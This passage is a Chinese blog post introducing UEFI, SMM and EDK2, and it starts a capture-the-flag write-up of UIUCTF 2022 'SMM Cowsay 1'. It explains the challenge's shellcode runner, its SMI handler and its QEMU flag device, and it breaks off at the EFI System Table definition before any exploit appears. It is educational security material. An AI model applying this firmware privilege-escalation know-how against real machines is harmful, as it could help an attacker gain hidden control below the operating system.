<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>uefi初识 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hard">
<meta property="og:type" content="article">
<meta property="og:title" content="uefi初识">
<meta property="og:url" content="https://ixout.github.io/posts/36191/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="hard">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg">
<meta property="article:published_time" content="2024-04-06T14:37:09.000Z">
<meta property="article:modified_time" content="2024-04-18T09:11:31.848Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="uefi">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/36191/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'uefi初识',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-18 17:11:31'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">uefi初识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-06T14:37:09.000Z" title="发表于 2024-04-06 22:37:09">2024-04-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-18T09:11:31.848Z" title="更新于 2024-04-18 17:11:31">2024-04-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">13.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>59分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>UEFI即Unified Extensible Firmware Interface(<strong>统一可扩展固件接口</strong>)是一种个人电脑系统规格，用来定义操作系统与系统固件之间的软件界面,作为BIOS的替代方案</p>
<p>更多可见wiki<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2">https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2</a></p>
<h2 id="UEFI组成"><a href="#UEFI组成" class="headerlink" title="UEFI组成"></a>UEFI组成</h2><p>一般认为，UEFI由以下几个部分组成：</p>
<ol>
<li>Pre-EFI初始化模块（PEI）</li>
<li>UEFI驱动程序执行环境（DXE）</li>
<li>UEFI驱动程序（UEFI driver）</li>
<li>兼容性支持模块（CSM）</li>
<li>UEFI高层应用（UEFI Application）</li>
<li>GUID磁盘分区表</li>
<li>系统管理模式（SMM）</li>
</ol>
<p>Pre-EFI初始化程序在系统开机的时候最先得到执行，它负责最初的CPU，芯片组及主存的初始化工作，<strong>紧接着加载UEFI的驱动程序执行环境（DXE）</strong>。</p>
<p>当DXE被加载运行时，系统便具有了枚举并加载其他UEFI驱动程序的能力。DXE枚举并加载各种总线（包括PCI、SATA、USB、ISA）及硬件的UEFI驱动程序。例如一个具PCI-E总线接口的RAID存储适配器，其UEFI驱动程序一般会放置在这个设备的Option ROM中。在UEFI规范中，一种突破传统MBR磁盘分区结构限制的GUID磁盘分区系统（GPT）被引入，新结构中，磁盘的主分区数不再受限制（在MBR结构下，只能存在4个主分区），另外UEFI+GPT结合还可以支持2.1 TB以上硬盘。</p>
<p>在众多的分区类型中，EFI系统分区可以被UEFI固件访问，可用于存放操作系统的引导程序。UEFI固件通过执行EFI系统分区中的启动程序启动操作系统]。</p>
<p>CSM是在x86平台UEFI系统中的一个特殊的模块，它将为不具备UEFI引导能力的操作系统以及16位的传统Option ROM提供类似于传统BIOS的系统服务。</p>
<p>在加载操作系统后，UEFI的SMM程序继续执行，提供ACPI等服务</p>
<h2 id="SMM"><a href="#SMM" class="headerlink" title="SMM"></a>SMM</h2><blockquote>
<p>系统管理模式（System Management mode）（以下简称SMM）是Intel在80386SL之后引入x86体系结构的一种CPU的执行模式。系统管理模式只能通过系统管理中断（System Management Interrupt, SMI）进入，并只能通过执行RSM指令退出。SMM模式对操作系统透明，换句话说，操作系统根本不知道系统何时进入SMM模式，也无法感知SMM模式曾经执行过。为了实现SMM，Intel在其CPU上新增了一个引脚SMI# Pin，当这个引脚上为高电平的时候，CPU会进入该模式。在SMM模式下一切被都屏蔽，包括所有的中断。SMM模式下的执行的程序被称作SMM处理程序，所有的SMM处理程序只能在称作系统管理内存（System Management RAM,SMRAM）的空间内运行。可以通过设置SMBASE的寄存器来设置SMRAM的空间。SMM处理程序只能由系统固件（如BIOS或UEFI）实现。</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/System_Management_Mode">System Management Mode</a> is documented in <a target="_blank" rel="noopener" href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a>, Volume 3C, Chapter 30. It is the operating mode with highest privilege, and sometimes referred to as “ring -2”. This mode has higher privilege than an OS/kernel (ring 0) and even an hypervisor (ring -1). It can only be entered through a System Management Interrupt (SMI), it has a separate address space completely invisible to other operating modes, and full access to all physical memory, MSRs, control registers etc.</p>
</blockquote>
<p>SMM有时被称作 <code>ring -2</code>,因为其具有最高级别权限<strong>,唯一进入该模式的方式只有SMI</strong>(系统管理中断)</p>
<p>处理器执行<em>SMM</em>代码的时候是在一个单独的地址空间（<em>SMRAM</em>）下完成的，并且这段地址空间在其他模式下是绝对不能被访问的</p>
<p>SMI 可以由软件使用 IO 端口 <code>0xB2</code> 触发(<u>outb dx, al</u>)，并且此功能可用于实现 SMM 和非 SMM 代码之间的某种受控通信机制。并通过<code>RSM</code>指令退出SMM</p>
<h2 id="UEFI与操作系统的关系"><a href="#UEFI与操作系统的关系" class="headerlink" title="UEFI与操作系统的关系"></a>UEFI与操作系统的关系</h2><p>UEFI在概念上类似于一个低阶的操作系统，并且具有操控所有硬件资源的能力。不少人感觉它的不断发展将有可能代替现代的操作系统。事实上，EFI的缔造者们在第一版规范出台时就将EFI的能力限制于不足以威胁操作系统的统治地位。</p>
<p>首先，它只是硬件和预启动软件间的接口规范；其次，UEFI环境下<strong>不提供中断的机制</strong>，也就是说每个UEFI驱动程序必须用<strong>轮询</strong>（polling）的方式来检查硬件状态，并且需要以<strong>解释</strong>的方式运行，较操作系统下的机械码驱动效率更低；再则，UEFI系统不提供复杂的缓存器保护功能，它只具备简单的缓存器管理机制，具体来说就是指运行在x64或x86处理器的长模式或保护模式下，以最大寻址能力为限把缓存器分为一个平坦的段（Segment），所有的程序都有权限访问任何一段位置，并不提供真实的保护服务。</p>
<p>当UEFI所有组件加载完毕时，便会启动操作系统的启动程序，如果UEFI固件内置UEFI Shell，也可以启动UEFI Shell命令提示。<u>UEFI应用程序（UEFI Application）和UEFI驱动程序（UEFI driver）是PE格式的.efi文件，可用C语言编写。</u>在UEFI引导模式下，操作系统的启动程序也是UEFI应用程序，启动程序的EFI文件存储在EFI系统分区（ESP）上。</p>
<p>UEFI固件区分架构，在UEFI引导模式下，通常只能执行特定架构的UEFI操作系统和特定架构的EFI应用程序（EBC程序除外）。比如，采用64位UEFI固件的PC，在UEFI引导模式下只能执行64位操作系统启动程序；而在Legacy引导模式（即BIOS兼容引导模式）下，既可以执行16位的操作系统（如DOS），也可以执行32位操作系统和64位操作系统。</p>
<h2 id="EDK2"><a href="#EDK2" class="headerlink" title="EDK2"></a>EDK2</h2><p><a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/tree/master">tianocore/edk2: EDK II</a></p>
<p>EDK2（EFI Development Kit II）是一个开源的项目，它提供了一个用于开发 UEFI（统一扩展固件接口）固件的全面工具和框架。</p>
<p>也是事实上的UEFI的实现</p>
<p>我们做的题目都是是基于EDK2,大多数时候给的是OVMF.fd</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="uictf2022-cowsay1"><a href="#uictf2022-cowsay1" class="headerlink" title="uictf2022-cowsay1"></a>uictf2022-cowsay1</h2><p>参考<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/34881">CTFtime.org / UIUCTF 2022 / SMM Cowsay 1 / Writeup</a></p>
<p><strong>learn interface</strong></p>
<h3 id="摸索"><a href="#摸索" class="headerlink" title="摸索"></a>摸索</h3><p>我们收到的文件包含：</p>
<ul>
<li>构建的挑战二进制文件以及 <code>qemu-system-x86_64</code> 二进制文件和启动脚本提供了在本地运行挑战所需的参数。</li>
<li>挑战赛的源代码是 EDK2（事实上的标准 UEFI 实现）和 QEMU 的一系列补丁，以及用于应用它们并构建所有内容的 <code>Dockerfile</code> 。</li>
<li>为远程运行的挑战而完成的构建的 EDK2 构建工件（即带有有用调试符号的二进制文件）。</li>
</ul>
<p>运行挑战时，我们会收到以下消息：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Shell&gt; binexec</span><br><span class="line"> ____________________________________________________________________</span><br><span class="line">/ Welcome to binexec!                                                \</span><br><span class="line">| Type some shellcode <span class="keyword">in</span> hex and I<span class="string">&#x27;ll run it!                        |</span></span><br><span class="line"><span class="string">|                                                                    |</span></span><br><span class="line"><span class="string">| Type the word &#x27;</span><span class="keyword">done</span><span class="string">&#x27; on a seperate line and press enter to execute |</span></span><br><span class="line"><span class="string">\ Type &#x27;</span><span class="built_in">exit</span><span class="string">&#x27; on a seperate line and press enter to quit the program /</span></span><br><span class="line"><span class="string"> --------------------------------------------------------------------</span></span><br><span class="line"><span class="string">                    \   ^__^</span></span><br><span class="line"><span class="string">                     \  (oo)\_______</span></span><br><span class="line"><span class="string">                        (__)\       )\/\</span></span><br><span class="line"><span class="string">                            ||----w |</span></span><br><span class="line"><span class="string">                            ||     ||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Address of SystemTable: 0x00000000069EE018</span></span><br><span class="line"><span class="string">Address where I&#x27;</span>m gonna run your code: 0x000000000517D100</span><br></pre></td></tr></table></figure>
<p>其启动了一个<a target="_blank" rel="noopener" href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,事实上大多数uefi的题目使用的都是该开源软件,然后在其上进行一些patch</p>
<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>EDK2 补丁 <code>0003-SmmCowsay-Vulnerable-Cowsay.patch</code> 实现了一个名为 <code>SmmCowsay.efi</code> 的 UEFI SMM 驱动程序：该驱动程序将在 SMM 中运行，并注册一个要执行的处理程序（通过 <code>SmiHandlerRegister</code> 函数）在 SMM 中，打印文本的方式与owsay Linux 命令非常相似：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure>
<p><strong>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</strong></p>
<p>下一个补丁 <code>0004-Add-UEFI-Binexec.patch</code> 实现了一个名为 <code>Binexec.efi</code> 的普通UEFI驱动程序，它将与我们交互（通过控制台输入/输出）并与 <code>SmmCowsay.efi</code> 驱动程序交互以打印我们在运行挑战时看到上面的问候横幅。</p>
<p>为了与 <code>SmmCowsay.efi</code> 驱动程序进行通信， <code>Binexec.efi</code> 通过 <code>EFI_SMM_COMMUNICATION_PROTOCOL</code> 结构体提供的 <code>-&gt;Communicate()</code> 方法发送一条“消息”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;Communicate(</span><br><span class="line">    mSmmCommunication, <span class="comment">// &quot;THIS&quot; pointer</span></span><br><span class="line">    Buffer,            <span class="comment">// Pointer to message of type EFI_SMM_COMMUNICATE_HEADER</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>该函数将消息复制到全局变量中并触发软件 SMI 来处理它。该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</p>
<p><code>Binexec.efi</code> 驱动程序将简单地在循环中运行，要求我们提供一些十六进制形式的代码，将其复制到 RWX 内存区域，然后跳转到其中（使用程序集包装器保存/恢复寄存器）。这意味着我们能够在 UEFI 驱动程序内运行任意代码，该驱动程序以超级用户模式（也称为 Ring 0）运行。</p>
<p>QEMU 补丁实现了一个自定义 MMIO 设备，该设备只需读取主机上的 <code>region4</code> 文件，并创建一个从物理地址 <code>0x44440000</code> 开始、大小为 <code>0x1000</code> 的 MMIO 内存区域。保存该文件的内容。这意味着访问地址 <code>0x44440000</code> 处的物理内存将调用 QEMU 设备读/写操作 ( <code>MemoryRegionOps</code> )，这将决定如何处理内存读/写。</p>
<p>读取操作处理程序 ( <code>uiuctfmmio_region4_read_with_attrs()</code> ) 执行检查，确保读取在传递给函数的 <code>MemTxAttrs</code> 结构中设置了 <code>.secure</code> 标志，这意味着读取由SMM发出。如果不是这种情况，则会返回一个假标志：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">uiuctfmmio_region4_read_with_attrs</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> *val, <span class="type">unsigned</span> size, MemTxAttrs attrs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!attrs.secure)</span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);</span><br><span class="line">    <span class="keyword">return</span> MEMTX_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EFI-System-Table"><a href="#EFI-System-Table" class="headerlink" title="EFI System Table"></a>EFI System Table</h3><p>打印给我们的信息,还让我们获得了 <code>SystemTable</code> 的地址以及 shellcode 将复制（和运行）的地址。在 UEFI 规范上花费的时间可能超出了所需的时间，它包含了我们了解其含义所需的所有信息。</p>
<p><code>SystemTable</code> 是 EFI 系统表，它是一个包含在 UEFI 驱动程序中执行任何操作所需的所有信息的结构。它保存了一堆指向其他结构的指针，这些结构实际上保存了另一堆指向 API 方法、配置变量等的指针。</p>
<blockquote>
<p>UEFI uses the EFI System Table, which contains pointers to the runtime and boot services tables. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the service tables are pointers to functions as defined in <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> and <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/08_Services_Runtime_Services.html#services-runtime-services">Services — Runtime Services</a> . Prior to a call to <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a> , all of the fields of the EFI System Table are valid. After an operating system has taken control of the platform with a call to <em>ExitBootServices()</em> , only the <em>Hdr</em> , <em>FirmwareVendor</em> , <em>FirmwareRevision</em> , <em>RuntimeServices</em> , <em>NumberOfTableEntries</em> , and <em>ConfigurationTable</em> fields are valid.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER                 Hdr;</span><br><span class="line">  CHAR16                           *FirmwareVendor;</span><br><span class="line">  UINT32                           FirmwareRevision;</span><br><span class="line">  EFI_HANDLE                       ConsoleInHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_INPUT_PROTOCOL   *ConIn;</span><br><span class="line">  EFI_HANDLE                       ConsoleOutHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *ConOut;</span><br><span class="line">  EFI_HANDLE                       StandardErrorHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *StdErr;</span><br><span class="line">  EFI_RUNTIME_SERVICES             *RuntimeServices;</span><br><span class="line">  EFI_BOOT_SERVICES                *BootServices;</span><br><span class="line">  UINTN                            